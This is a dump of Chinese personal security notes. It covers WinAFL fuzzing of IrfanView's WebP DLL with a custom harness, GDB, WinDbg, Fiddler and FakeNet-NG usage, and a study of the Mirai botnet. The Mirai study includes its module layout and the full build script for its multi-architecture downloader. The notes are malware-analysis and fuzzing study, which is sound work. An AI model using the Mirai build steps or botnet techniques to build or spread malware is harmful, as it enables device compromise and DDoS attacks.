afl-fuzz.exe -i C:\\Users\\moshe\\Desktop\\fuzz\\irfanview_cmin -o C:\\Users\\moshe\\Desktop\\fuzz\\winafl_output -t 1000+ -D C:\\Users\\moshe\\Desktop\\fuzz\\dynamorio\\build\\bin32 -- -coverage_module \"i_view32.exe\" -target_module \"i_view32.exe\" -target_offset 0x082550 -- C:\\Users\\moshe\\Desktop\\fuzz\\iview457\\i_view32.exe @@ /convert=\"NUL\" /silent iotD这些参数都是固定的含义 -- 作为分隔符 target_offset：目标的相对于文件头的偏移 开始测试： 不难发现，全是一堆time out，这显然是不成功的。但是基本的流程清楚了。这是因为他找不到要测试的dll库了，需要手动patch一下目标程序让他可以在本目录中寻找插件dll，否则winafl会报错，winafl不能跨目录 修改一下这里，然后将webp托到同目录就可以了就可以同目录测试了。 -f 这个测试可以指定输入文件的名称，如下所示： afl-fuzz.exe -i in -o out -S s1 -D \"D:\\DynamoRIO9.92.19461\\bin32\" -f test.webp -t 7000 -- -c overage_module WebP.dll -target_module call_webp.exe -target_offset 0x0155c -fuzz_iterations 8000 -nargs 1 -- call_webp.exe @@ 这个输入会根据in目录中的文件变异得到。 提高效率 直接通过原始程序测试会有许多其他路径，降低fuzz的速度，实测峰值在40次每s左右，这里我们可以手动写一个calldll程序来进行fuzz 首先就是要搞清楚dll里某个导出函数的参数，ida可能会出错，所以这里我们要x64dbg和ida联合调试，下面是我写的calldll文件，可以将速度提升到1000次每秒左右，速度非常快，仅供参考：利用下面的程序我们可以只fuzz下面的那个fuzz函数，防止fuzz程序陷入其他无用模块。 #include #include // L\"\\x65E0\\x0000\\x215B\\x54C4\" 2 wchar_t iarg3[520] = { 0 }; wchar_t iarg4[520] = { 0 }; int iarg5[17] = {0}; // typedef void (WINAPI *Readwebp_W)(char *D, wchar_t a2[], wchar_t arg2[] , wchar_t *ini_path, wchar_t* file_path); typedef void (WINAPI *Readwebp_W)(LPCWSTR file_path, LPCWSTR ini_path, wchar_t *arg3, wchar_t *arg4, int *arg5); void fuzz(Readwebp_W readwebp_W, LPCWSTR file_path) { LPCWSTR lpFileName = TEXT(L\"C:\\\\Users\\\\Rootkit\\\\AppData\\\\Roaming\\\\IrfanView\\\\i_view32.ini\"); readwebp_W(file_path, lpFileName, iarg3, iarg4, iarg5); } int main(int argc, char **argv) { HMODULE PDFDLL = LoadLibraryA(\"C:\\\\Users\\\\Rootkit\\\\Desktop\\\\winafl-TEST\\\\IrfanView\\\\webp.dll\"); if(PDFDLL == NULL) { printf(\"call pdf.dll wrong , error code : %d\\n\", GetLastError()); return 0; } Readwebp_W readWebp = (Readwebp_W)GetProcAddress(PDFDLL, \"ReadWebP_W\"); if (readWebp == NULL) { printf(\"GetProcAddress readWebp failed! error code: %d\\n\", GetLastError()); FreeLibrary(PDFDLL); return 1; } int len = strlen(argv[1]); // length of input string // calculate required length of wide byte string (add 1 for null terminator) int wideLen = MultiByteToWideChar(CP_UTF8, 0, argv[1], len, NULL, 0) + 1; printf(\"%d\\n\", wideLen); wideLen = len + 1; // UTF-8 to wide char conversion, assuming all chars are the same (no surrogates printf(\"%d\\n\", wideLen); // allocate memory for wide byte string LPWSTR wideStr = (LPWSTR) malloc(wideLen * sizeof(wchar_t)); // convert narrow byte string to wide byte string MultiByteToWideChar(CP_UTF8, 0, argv[1], len, wideStr, wideLen); // null-terminate the wide byte string wideStr[wideLen - 1] = 0; printf(\"i will call the fuzz func\\n\"); fuzz(readWebp, wideStr); FreeLibrary(PDFDLL); return 0; } 然后通过-M maste和-S s1这些参数来多开进程来提高效率，影响到内存和cpu，每一个进程会独占一个cpu核心，内存也会成波浪式使用，所以要懂得取舍。 实际效果 afl-fuzz.exe -i in -o out -M master -D \"D:\\DynamoRIO9.92.19461\\bin32\" -t 7000 -- -c overage_module WebP.dll -target_module call_webp.exe -target_offset 0x0155c -fuzz_iterations 8000 -nargs 1 -- call_webp.exe @@ afl-fuzz.exe -i in -o out -S s1 -D \"D:\\DynamoRIO9.92.19461\\bin32\" -t 7000 -- -c overage_module WebP.dll -target_module call_webp.exe -target_offset 0x0155c -fuzz_iterations 8000 -nargs 1 -- call_webp.exe @@ afl-fuzz.exe -i in -o out -S s2 -D \"D:\\DynamoRIO9.92.19461\\bin32\" -t 7000 -- -c overage_module WebP.dll -target_module call_webp.exe -target_offset 0x0155c -fuzz_iterations 8000 -nargs 1 -- call_webp.exe @@ afl-fuzz.exe -i in -o out -S s3 -D \"D:\\DynamoRIO9.92.19461\\bin32\" -t 7000 -- -c overage_module WebP.dll -target_module call_webp.exe -target_offset 0x0155c -fuzz_iterations 8000 -nargs 1 -- call_webp.exe @@ 速度相当可观，大概是测试了33小时，当last new path的值长时间不变的时候，就差不多可以停了，我停止的时候他已经4小时没有新路径了，所以就停了，也没有fuzz出crash。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-27 21:17:24 "},"MyArticles/ToolUsage/GDB使用.html":{"url":"MyArticles/ToolUsage/GDB使用.html","title":"GDB使用","keywords":"","body":"因为GDB类似于windbg都是基于命令行的调试器，所以会出现一些指令，记录一下，长时间不用就忘了 GDB原理 GDB调试包括2个程序：gdb程序和被调试程序。根据这2个程序是否运行在同一台电脑中，可以把GDB的调试模型分为2种：本地调试，远程调试。远程调试我没用过 本地调试 就直接在本地进行调试 远程调试 利用gdbserver来进行远程调试 GDB插件 peda $ git clone https://github.com/longld/peda.git ~/peda $ echo \"source ~/peda/peda.py\" >> ~/.gdbinit 这个是最常用的一个，可以结构话的高亮一些代码 gef pwndbg GDB命令 断点 breakpoint：软件断点 hbreakpoint：硬件断点 rwatch：设置读取观察点，实现内存断点 watch：写入时gdb中断 awatch：读写都中断 t前缀：一次性断点 info b：查看断点 enable：激活断点 disable：禁用断点 修改值 set $eax=10：修改寄存器或者内存中的值，利用set命令 查看值 x/ n、f、u是可选的参数。 x /4xg $ebp：查看ebp开始的4个8字节内容 x/wx $esp 　　以4字节16进制显示栈中内容 b表示单字节，h表示双字节，w表示四字 节，g表示八字节 s 按字符串输出 x 按十六进制格式显示变量。 d 按十进制格式显示变量。 u 按十六进制格式显示无符号整型。 o 按八进制格式显示变量。 t 按二进制格式显示变量。 a 按十六进制格式显示变量。 c 按字符格式显示变量。 f 按浮点数格式显示变量。 i：反汇编 heapinfo：查看堆的信息 调式值 r：run开始执行 n：单步步过 s：单步步入 c：继续执行到下一个断点 fini：结束当前函数 context：查看运行上下文 stack 10：显示栈中的10项 bt：查看当前栈帧 启动 checksec：查看程序保护 pattern 100：生成100个随机字符，用于判断栈溢出 pattren offset “str”：用来定位偏移 set args：指定运行时参数 show args：查看设置的运行参数 附加进程 gdb procname pid gdb -p pid gdb attach pid（需要先启动gdb） 调试core文件 gdb procname corename 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-11 22:08:58 "},"MyArticles/ToolUsage/Fiddler学习.html":{"url":"MyArticles/ToolUsage/Fiddler学习.html","title":"Fiddler学习","keywords":"","body":"工作原理 以代理web服务器的形式工作的，它使用代理地址:127.0.0.1，端口:8888。 当Fiddler退出的时候它会自动注销， 这样就不会影响别的程序。不过如果Fiddler非正常退出，这时候因为Fiddler没有自动注销，会造成网页无法访问。 解决的办法是重新启动下Fiddler。 正常退出： Fiddler 汉化包插件任意版本可用 配置 为什么配置 不配置你抓不到包，更解析不到https请求包，那等于没用 配置过程 实质上就是给浏览器安装一个证书（PC端抓包），移动端抓包也一样，安装fiddler的证书 证书生成 工具--->选项 勾选下面的解密https，弹窗选中yes 然后一直选是，之后看到下面的选项，全选之后，点击Actions 选中这个选项，然后就在桌面上生成一个证书 证书导入 将证书导入到浏览器或者是手机目录下 这里用edge为例 选“受信任的根证书######”，然后导入刚刚的证书就可以了。 这时就可以进行抓包了，会自动显示浏览器里的包，但是如果这时发现全是http包，没有https的化，还是回到这个界面 把decrypt https和下面的两个选上，然后点击ok，就可以看到https包了 使用方式 窗口作用 大致可以看作三个模块，左边是会话列表，下面是命令行，右边的上面是客户端请求，下面的服务器响应。 会话列表 Result : HTTP响应的状态 Protocol：请求使用的协议（如HTTP/HTTPS） HOST：请求地址的域名/ip URL：请求的服务器路径和文件名，也包含GET参数 BODY：请求的大小，以byte为单位 Content-Type：请求响应的类型 Caching：请求的缓存过期时间或缓存控制header的值 Process：发出此请求的Windows进程及进程ID Comments ：用户通过脚本或者菜单给此session增加的备注 custom：用户可以通过脚本设置的自定义值 这里直接中英备注，不是所有时候都能拿到中文的fiddler 请求列表 网格视图可以很简单的查看键值关系 响应列表 工具栏的作用基本和请求列表的作用相同，但是这里是服务器的回应。 上图是抓到的itest的响应，可以看到时间等一系列的信息 设置过滤 过滤host 这里找到工具栏的Filters，然后点击使用过滤，写上要接受的host的地址，多个地址的话用分号隔开。 这样fiddler只能抓到指定host的数据包了，但是用完记得取消。 过滤特点URL 抓包很全面，把图片，图标全都抓到了，分析起来很困难，所以设置一下让他直接忽略那些不重要的东西 REGEX:(?insx)/[^\\?&]*\\.(css|ico|jpg|png|gif|bmp|wav|js)(\\?.*)?$ 这里直接正则表达式过滤 如下图进行使用 也可以用 这个功能，删除特定的数据包，方便分析。 最后别忘了点击右上角的Action里的run，不然就白设置了。 断点和重放 两种断点 before response：这个是打在request请求的时候，未到达服务器之前 点一下这个框，变成红色，就是设置了请求断点。拦截了请求包。 after response：也就是服务器响应之后，在Fiddler将响应传回给客户端之前 上述地方再点一下，就变成了响应断点 另一种方式 也可以在这里设置断点。 还可以 bpu https://www.baidu.com/” 回车执行，接下来就会中断URL中包含此地址的请求。 输入bpu进行取消。 修改包内容 断点段下来之后，就可以修改包的内容 这里用itest为例 在断点断下包之后，直接在这个界面就可以修改 这里把history改成false，或者后面改成1，都会看到不同的现象。 同理，下响应断点也可以修改服务器端响应的内容。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2022-05-18 11:41:22 "},"MyArticles/ToolUsage/windbg记录.html":{"url":"MyArticles/ToolUsage/windbg记录.html","title":"windbg使用","keywords":"","body":"记录windbg的常用命令和调试方法，没有中文版，全是英文，比较难受。使用起来类似于Windows上的gdb调试。 窗口设置 windbg初始窗口设置比较单一，无法满足正常的调试需要，所以需要补充几个窗口： 最终结果： 主题比较单一，就一个亮模式一个暗模式。可以从工具栏的view窗口来添加窗口。常用窗口： 寄存器：register 所有的值可以在双击后更改 反汇编：disassemble f9：下断点；f10相当于f8：单步步过；f11相当于f7：单步步进。 shift+f11：运行完当前函数，相当于fini 栈：stack 更加用户友好了，不会很乱 看到左下角有一个locals窗口，这个和vs调试窗口一样，可以显示局部变量。 内存：memory，可以设置多个内存窗口，但是会比较拥挤。 把之前的删了，直接输入地址就可以自动跳转到相关地址，可以实现在内存中转到。 从文件选项中可以载入程序，或者附加进程，或者附加其他的东西，比如内核和远程调试 设置好界面之后，可以将当前的配置进行保存，方便之后一直使用而不用重新设计。 常用命令 1、标准命令 调试 t 或者 F11 ===> 单步，遇到函数跟进（step into） p 或者 F10 单步 ===> 遇到函数跳过（step over） Shift + F11 ===> 跳出当前函数（step out）. 执行：go g [地址|函数名] ===> 持续执行到指定位置的指令 gh[地址|函数名] ===> 持续执行时，如果遇到异常则中断 gn[地址|函数名] ===> 持续执行时，即使遇到异常也忽略 断点：breakpoint 软件 bl ===> 列出已设置的断点。显示结果中，第一列为断点的 ID；第二列为断 点当前状态，‘e’表示断点处于活动状态（enable），‘d’表示断点暂 时被禁用；第三列为断点的位置（breakpoint list） be[断点 ID] ===> 激活断点（breakpoint e nable） bd[断点 ID] ===> 禁用断点（breakpoint disa ble） bc[断点 ID] ===> 清除断点（break point clear） bp[地址|函数名] ===> 设置断点。如不指定地址，则在当前指令上下断点。 注意，这里介绍的是最基础的断点方式，WinDbg 中可以结合地址、函数名、消息等各种条件设置很复杂的断点。此外，bu、bm 等命令也可设置断点. bu ===> 设置一个延迟的以后再求解的断点，用于对尚未加载模块中的代码设置断点。当指定的模块被加载时，WinDBG会真正落实这个断点。所以bu命令对于调试动态加载模块的入口函数或者初始化代码特别有用 bm ===> 用来批量设置断点。比如： 对于msvcr80d模块中的所有print开头的函数设置断点：bm msvcr80d!print* 硬件 WinDBG的ba命令用来设置硬件断点，其格式如下： ba [ID] Access Size [Option] [Address[Passes]] [\"Command String\"] ID用来指定断点序号 Access用来指定触发断点的访问方式 可以为以下几个字母之一 e 读取和执行时触发断点 r 读取和写入时触发断点 w 写入时触发断点 i 有IO操作时触发断点 Size用来指定访问的长度 x86系统可以为1 2 4三种值 Passes参数和CommandString参数的用法与设置软件断点命令中的一样 使用例子： 对内存地址0041717c的一字节访问、字访问、双字访问（读写）都会触发这个断点 ba r1 0x401000 查看硬件寄存器的状态的话要直接去看DR状态寄存器。 数据显示：display d [地址] ===> 显示内存数据。默认情况下按照字节和 ASCII 显示，即等同于 DB 命令。如果修改了显示模式，再次使用时则与最后一次数据显示命令所使用的显示模式相同 db [地址] ===> 按照字节模式显示内存数据（display byte） dd [地址] ===> 按照双字模式显示内存数据（display dword） dD ===> 按双精度浮点数的模式显示内存数据。注意这条命令和前面一条命令是区别大小写的（display Double Float） da ===> 按 ASCII 模式显示（display ASCII） du ===> 按 Unicode 模式显示（display Unicode） ds ===> 按字符串模式显示。注意，在没有‘\\0’作为字符串结束时，不要轻易用这条命令打印内存，否则 WinDbg 会将遇到的第一个 NULL 前的东西都打印出来（display String） dt ===> 套用已知的数据结构模板（structure）显示内存。这个命令很有用，例如，在调试堆时可以直接用这个命令把内存按照堆表的格式显示出来。 r ===> 查看寄存器的值【r rax】 数据编译：edit e [地址][数据] ===> 修改任意内存地址的值 Eb` ===> 以字节形式写入 ed[地址][数据] ===> 以双字形式写入 ea[地址][数据] ===> 以 ASCII 字符形式写入，注意，ASCII 字符串需要加双引号 eu[地址][数据] ===> 以 Unicode 字符形式写入，注意，Unicode 字符串需要加双引号 其他 栈相关 命令 含义 k 显示调用堆栈 kb 显示调用堆栈和栈上的前三个参数 kp 参数和参数值都以函数原型格式显示出来(必须有符号) kv kb命令的基础上增加显示FPO信息和调用约定 kn 命令会在每行前显示栈帧的序号 但是这里显示的参数是 在栈上的 参数，在寄存器里的参数看不到。 搜索 输入命令 s –a 00400000 L53000 “Wrong” 该命令的意思是以ASCII码形式在内存地址00400000往后53000个字节搜索字符串“Wrong”。 s，就是要调用查找的命令 -a，指定使用ASCII码的形式查找 00400000，指定要开始寻找的内存地址。 WinDbg不支持模糊搜索，所以这里输入的字符串必定要完全正确。 没有xdbg那种显示所有字符串的能力 2、元命令 用来提供标准命令没有提供的调试功能，与标准命令一样，元命令也是内建在调试器引擎或者WinDBG程序文件中的。 所有元命令都以一个点（.）开始，所以元命令也被称为点命令。例如 .reload 重新载入符号 .reboot 重启目标机器 .restart 重启调试器 .logfile 显示信息 3、拓展命令 扩展命令用于扩展某一方面的调试功能。与标准命令和元命令是内建在WinDBG程序文件中不同，扩展命令是实现在动态加载的扩展模块（DLL）文件中的。所有的拓展命令用!开头 通过WinDBG的SDK，用户可以编写自己的扩展模块和扩展命令，例如漏洞测试常用的一个mona插件 4、伪寄存器 WinDBG自动定义了很多伪寄存器。在命令行和命令文件中都可以使用伪寄存器。WinDBG会自动将其替换（展开）为合适的值。例如下面这个@$scopeip就是一个伪寄存器，它代表当前的eip指针。 查阅可以得到一些常用的伪寄存器 伪寄存器 含义 $ea 调试目标所执行上一条指令的有效地址 $ea2 调试目标所执行上一条指令的第二个有效地址 $exp 表达式评估器所评估的上一条表达式 $ra 当前函数的返回地址 $eip 指令指针寄存器 $eventip 当前调试事件发生时的指令指针 $previp 上一事件的指令指针 $relip 与当前事件关联的指令指针 $scopeip 当前上下文的指令指针 $exentry 当前进程的入口地址 $retreg 首要的函数返回值寄存器 $retreg64 64位格式的首要函数返回寄存器 $csp 栈顶指针ESP $p 上一个内存显示命令所打印的第一个值 $proc 当前进程EPROCESS结构的指针 $thread 当前线程ETHREAD结构的指针 $peb 当前进程的进程环境块(PEB)的地址 $teb 当前线程的线程环境块(TEB)地址 $tpid 拥有当前线程的进程ID(PID) $tid 当前线程的线程ID $bpx X号断点的地址 $frame 当前栈帧的序号 $dbgtime 当前时间 $callret 使用.call命令调用的上一个函数的返回值 $ptrsize 调试目标所在系统的指针类型宽度 $pagesize 调试目标所在的系统的内存页字节数 软件调试：r3 windbg的灵魂是内核调试和驱动调试以及dump文件分析，但是先用r3来熟悉一下怎么使用。 基本调试 寻找入口点 不像xdbg一样，会自动段在程序入口点，windbg会断在程序初始化的dll库中，而且断的很细致，所以需要手动定位程序入口点： 1、查看载入的所有模块：lm 获得到了载入内存中的要调试程序的baseaddr。 2、查看入口点RVA：!dh -a model_name !dh命令还是用处比较广泛的 0:000> !dh -h Usage: dh [options] address Dumps headers from an image based at address Options: -a Dump everything ;查看所有信息 -f Dump file headers ;查看文件头 -s Dump section headers ;查看节区头 -e Dump exports ;查看导出表 -i Dump imports ;查看导入表 这里其实要获得入口点的话无所谓用哪个命令，因为他在前面的具体程序信息里。 断点 直接base+rva的地址处下一个断点防止跑飞： 执行 直接go到这个地址就可以了。 command界面可以显示汇编，但是比较有限，所以我一般习惯额外开一个disassem界面来观察汇编。 高级调试 模块加载时断点 sx：控制被调试的程序发生某个异常或特定事件时，调试器要采取的动作 0:000> sx ct - Create thread - ignore et - Exit thread - ignore cpr - Create process - ignore epr - Exit process - break ld - Load module - output ud - Unload module - ignore ser - System error - ignore ibp - Initial breakpoint - break iml - Initial module load - break out - Debuggee output - output av - Access violation - break - not handled asrt - Assertion failure - break - not handled aph - Application hang - break - not handled bpe - Break instruction exception - break bpec - Break instruction exception continue - handled eh - C++ EH exception - second-chance break - not handled clr - CLR exception - second-chance break - not handled clrn - CLR notification exception - second-chance break - handled cce - Control-Break exception - break cc - Control-Break exception continue - handled cce - Control-C exception - break cc - Control-C exception continue - handled dm - Data misaligned - break - not handled dbce - Debugger command exception - ignore - handled gp - Guard page violation - break - not handled ii - Illegal instruction - second-chance break - not handled ip - In-page I/O error - break - not handled dz - Integer divide-by-zero - break - not handled iov - Integer overflow - break - not handled ch - Invalid handle - break hc - Invalid handle continue - not handled lsq - Invalid lock sequence - break - not handled isc - Invalid system call - break - not handled 3c - Port disconnected - second-chance break - not handled svh - Service hang - break - not handled sse - Single step exception - break ssec - Single step exception continue - handled sbo - Security check failure or stack buffer overrun - break - not handled sov - Stack overflow - break - not handled vs - Verifier stop - break - not handled vcpp - Visual C++ exception - ignore - handled wkd - Wake debugger - break - not handled rto - Windows Runtime Originate Error - second-chance break - not handled rtt - Windows Runtime Transform Error - second-chance break - not handled wob - WOW64 breakpoint - break - handled wos - WOW64 single step exception - break - handled * - Other exception - second-chance break - not handled sxe：在任何错误处理器被激活之前目标立即中断到调试器中 驱动调试：r0 利用vmware和windbg的联动进行调试，防止本机死机蓝屏。但是我还不会，等用到再说 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-28 19:17:06 "},"MyArticles/ToolUsage/fakenet.html":{"url":"MyArticles/ToolUsage/fakenet.html","title":"真假C&C - fakenet","keywords":"","body":"参考： 使用FakeNet-NG改进动态恶意软件分析 - FreeBuf网络安全行业门户 GitHub - mandiant/flare-fakenet-ng: FakeNet-NG - Next Generation Dynamic Network Analysis Tool 十分感慨啊，这个项目2020年就停更了，2020我入学，感觉好像还是很新的项目，但是转念一看已经过去3、4年了，这个项目老了，我也该毕业了。总感觉好像就在昨天，谁能想到我初中数学老师，我们是她带的第一届学生，带了我们三年，现在她也是资深教师了。 光阴似骏马加鞭，日月如落花流水啊。 谁能想到，2018年已经过去5年了，有时候就是这么神奇，有些时间感觉过去很远，但是他却很近，有些感觉很近，但是他确实感觉过去了很久。 Windows使用 直接下载release就行了，双击使用，改改配置文件自定义也行。我在win10下没成功的跑起来，在win7下运行倒挺好的。但是需要在管理员权限下运行。 linux使用 没有release，需要自己编译，编译完事一运行就出问题。按github上说的来就行。尽量使用python36之上的版本来操作。 sudo apt-get install build-essential python-dev libnetfilter-queue-dev git clone https://github.com/mandiant/flare-fakenet-ng/ python3 setup.py install 在安装的过程中，看着缺啥就pip啥，因为他自动pip比较慢，不知道为啥还会报错，所以看他在下什么另外开一个窗口下就行了。完事就可以 运行了。 但是这里不知道为啥53一直被占用，也是本地的dns解析占用的，这不合理。直接把那几个占用的进程都kill掉，再运行就报错了： 核心错误就是： FileNotFoundError: [Errno 2] No such file or directory: '/proc/net/netfilter/nfnetlink_queue' 这个错误尚未找到解决办法，issue里的解决办法都扯淡，所以我就卡住了，还是用windows吧。linux就tcpdumps抓就完了，没有欺骗流量，正好减少工作量，直接分析完程序就可以交差了，省的再看流量猜功能了。 使用的命令和Windows上的命令都一样，直接跟到sudo python3 -m fakenet.fakenet后面就可以。 注意： 启动程序默认全局hook，会自动进行网址解析等等。 配置关系为default.ini ---> custom.ini ---> python程序。 响应的文件名称一定要以FakeNet格式命名。否则找不到。 流量包会保存到本地。 443-htttps；80，8080-http。 一直没机会用，分析的都是僵尸网络，linux上又用不了，Windows又没样本。先放着以后再说吧。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 21:05:00 "},"MyArticles/Botnet.html":{"url":"MyArticles/Botnet.html","title":"Botnet","keywords":"","body":"​ 该专题用来记录对于在实习中对僵尸网络的关注了解和记录，以及僵尸网络中常用的一些手法和可能的关联思路。 ​ 有些内容空白是要等到厂商公开发布之后才能发布。 -- 分析设备不同，内容迁移以及回顾需要时间，慢慢补充 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-13 12:58:27 "},"MyArticles/Botnet/mirai源码学习.html":{"url":"MyArticles/Botnet/mirai源码学习.html","title":"mirai源码分析学习","keywords":"","body":"概述 作为僵尸网络的开山鼻祖和集大成者以及后世不断效仿学习的mirai僵尸网络，在僵尸网络分析过程中拥有极高的地位和代码重复率。 学习mirai代码在分析的时候可以带来很多启发，同时也学到了很多东西。 僵尸网络主要的攻击方式有两种 ddos 挖矿 ddos攻击是最常见的一种盈利方式，通过向购买者提供ddos服务来获利，这也是一般的僵尸网络的经营方式。 有些家族同时兼具挖矿的功能，使用的也大多是xmrig开源挖矿程序，攻击目标主要集中在游戏、新闻媒体、制造业。这些行业的服务器性能良好，可以为挖矿提供物理支持。 mirai 构成 主要有三个模块构成： ├─dlr │ └─release ├─loader # 将payload安装到目标设备 │ ├─bins │ └─src │ └─headers ├─mirai # mirai的核心代码 │ ├─bot # 在设备上运行的主体,主要的恶意代码 │ ├─cnc # 和后端服务器通信，用来接收命令等 │ └─tools # 其他的辅助工具 └─scripts └─images 攻击流程 mirai僵尸网络的基本攻击流程如下：其他botnet的攻击流程也不尽相同，我们能拿到的样本基本都是下面的样本。 ├─mirai # mirai的核心代码 │ ├─bot 首先利用各种方式向设备种投递木马，之后被感染设备通过爆破或者其他方式来扫描攻击其他的互联设备，达到扩散的目的。这样就得到了大量的受控主机，从而提高攻击的威力。 期间木马可以根据写好的东西自动扩散，或者是通过cnc控制主机进行指令下发和信息数据回传。 mirai基本都是C语言编写的，cnc模块使用go编写。 常见功能 botnet的样本基本具备如下功能 ddos 挖矿 公网、内网扫描 telnet或者ssh等爆破 自删除 喂狗 …… 样本特点 不仅仅是mirai，其他botnet也具有如下特点。 自删除 配套启动、扩散、删除的shell脚本 各种系统调用 手动实现的库函数 持久化 利用api获取受害者公网ip …… 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-25 09:41:16 "},"MyArticles/Botnet/dlr.html":{"url":"MyArticles/Botnet/dlr.html","title":"dlr","keywords":"","body":"dlr目录分析 主要有三个文件，也是简单的一个目录： release目录：存放的编译好的多平台的dlr build.sh：存放了很多gcc的各种平台的编译命令 main.c：程序本身 build.sh 文件的所有内容如下，对应各种平台的编译命令 armv4l-gcc -Os -D BOT_ARCH=\\\"arm\\\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.arm armv6l-gcc -Os -D BOT_ARCH=\\\"arm7\\\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.arm7 i686-gcc -Os -D BOT_ARCH=\\\"x86\\\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.x86 m68k-gcc -Os -D BOT_ARCH=\\\"m68k\\\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.m68k mips-gcc -Os -D BOT_ARCH=\\\"mips\\\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.mips #mips64-gcc -Os -D BOT_ARCH=\\\"mps64\\\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.mps64 mipsel-gcc -Os -D BOT_ARCH=\\\"mpsl\\\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.mpsl powerpc-gcc -Os -D BOT_ARCH=\\\"ppc\\\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.ppc sh4-gcc -Os -D BOT_ARCH=\\\"sh4\\\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.sh4 #sh2elf-gcc -Os -D BOT_ARCH=\\\"sh2el\\\" -D SH2EL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.sh2el #sh2eb-gcc -Os -D BOT_ARCH=\\\"sh2eb\\\" -D SH2EB -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.sh2eb sparc-gcc -Os -D BOT_ARCH=\\\"spc\\\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.spc armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./release/dlr.arm armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./release/dlr.arm7 i686-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./release/dlr.x86 m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./release/dlr.m68k mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./release/dlr.mips mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./release/dlr.mpsl powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./release/dlr.ppc sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./release/dlr.sh4 sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./release/dlr.spc 单独分析一条命令： 编译命令 i686-gcc -Os -D BOT_ARCH=\\\"x86\\\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.x86 -D来配置main里面的两个宏的内容 -Os设置优化级别最高，减少代码体积 -e指定文件的入口点，没有main函数，只有start函数 -nostartfiles不连接标准库文件头，用来减少文件的体积（文件基本上调用的sys_call，有没有头文件无所谓） -fdata-sections每个数据项放在单独节区,方便后续的strip操作移除未用节区 -ffunction-sections 每个函数放在独立的节区，理由同上 优化命令 i686-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame 